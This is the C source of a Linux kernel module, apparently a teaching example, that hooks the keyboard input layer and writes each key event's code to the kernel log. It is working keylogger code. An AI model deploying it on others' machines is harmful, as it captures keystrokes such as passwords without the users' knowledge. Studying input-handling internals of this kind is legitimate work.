#include <linux/slab.h>		/* Memory allocation used */
#include <linux/input.h>
#include <linux/string.h>	/* Cannot use C library... */
#include <linux/kernel.h>	/* We're doing kernel work */
#include <linux/module.h>	/* Specifically, a module */

MODULE_DESCRIPTION("Example module: Keyboard logger on event layer.");
MODULE_AUTHOR("Michael Sonntag <michael.sonntag@ins.jku.at>");
MODULE_LICENSE("GPL");

#define DEVICE_NAME "AT Translated Set 2 keyboard"

static struct input_handle handle;

static int myConnect(struct input_handler *handler, struct input_dev *dev,const struct input_device_id *id) {
	int error;
	if(strcasecmp(dev->name,DEVICE_NAME)) {
		return 0;
	}
	printk(KERN_INFO "Connect to device \"%s\"\n",dev->name);
	handle.dev=dev;
	handle.handler=handler;
	handle.name="logger";
	error=input_register_handle(&handle);
	if(error) {
		printk(KERN_ERR "Could not register handle\n");
		return error;
	}
	error=input_open_device(&handle);
	if(error) {
		input_unregister_handle(&handle);
		printk(KERN_ERR "Could not open handle\n");
		return error;
	}
	return 0;
}

static void myDisconnect(struct input_handle *handle) {
	if(handle==NULL) {
		return;
	}
	printk(KERN_INFO "Disconnect from device \"%s\"\n",handle->dev->name);
	input_close_device(handle);
	input_unregister_handle(handle);
	handle->dev=NULL;
	handle->handler=NULL;
}
 
static bool myFilter(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
	bool suppress=false;
	if(type==EV_KEY) {
		printk(KERN_INFO "Keycode: Code=%d Value=%d\n",code,value);
	}
	return suppress;
}

static const struct input_device_id idsOfInterest[] = {
	{
		.flags = INPUT_DEVICE_ID_MATCH_EVBIT,
		.evbit = { BIT_MASK(EV_KEY) },
	},
	{ },
};

MODULE_DEVICE_TABLE(input,idsOfInterest);

static struct input_handler inputHandler={
	.name		= "Keylogger-Handler",
	.connect	= myConnect,
	.disconnect	= myDisconnect,
	.filter		= myFilter,
	.id_table	= idsOfInterest,
};

static int logger_init(void) {
	int res=input_register_handler(&inputHandler);
	if(res) {
		printk(KERN_ERR "Could not register input handler: %d\n",res);
		return res;
	}		
	printk(KERN_INFO "Keyboard logger added: %s\n",res?"FAIL":"Success");
	return res;
}

static void logger_cleanup(void) {
	input_unregister_handler(&inputHandler);
	printk(KERN_INFO "Keyboard logger removed\n");
}

module_init(logger_init);
module_exit(logger_cleanup);
